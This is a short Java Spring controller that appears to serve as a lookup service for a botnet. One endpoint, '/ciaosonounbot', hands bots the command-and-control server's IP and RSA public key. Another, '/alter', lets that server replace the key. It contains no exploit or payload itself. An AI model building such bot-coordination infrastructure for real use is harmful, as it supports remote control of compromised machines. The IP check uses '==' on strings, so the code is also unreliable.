package cs.sii.dns.controller;

import org.springframework.web.bind.annotation.RestController;

import cs.sii.dns.domain.IP;
import cs.sii.dns.domain.Pairs;

import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

@RestController
public class DNSController {
	
	PublicKey pki;
	
	@Autowired
	IP ipCec;
    
	@RequestMapping(value = "/ciaosonounbot")
    public Pairs<IP,String> ciaosonounbot() {
    	
		Pairs<IP,String> result=new Pairs<IP,String>();
    	
		result.setValue1(ipCec);
		String key=Base64.encodeBase64String(pki.getEncoded());
		result.setValue2(key);
        return result;
    }
    

    
    @RequestMapping(value = "/alter", method = RequestMethod.POST)
    public Boolean alter(@RequestBody Pairs<IP,String> cec, HttpServletResponse error,HttpServletRequest request) throws NoSuchAlgorithmException, NoSuchProviderException, InvalidKeySpecException {	
    	if(cec.getValue1().getIp()==ipCec.getIp()){
    		KeyFactory fact = KeyFactory.getInstance("RSA", "BC");
    		byte[] encoded=Base64.decodeBase64(cec.getValue2());
    		pki=fact.generatePublic(new X509EncodedKeySpec(encoded));
    		  return true;
    	}else{
    		return false;
    	}
      
    }
    
    
}
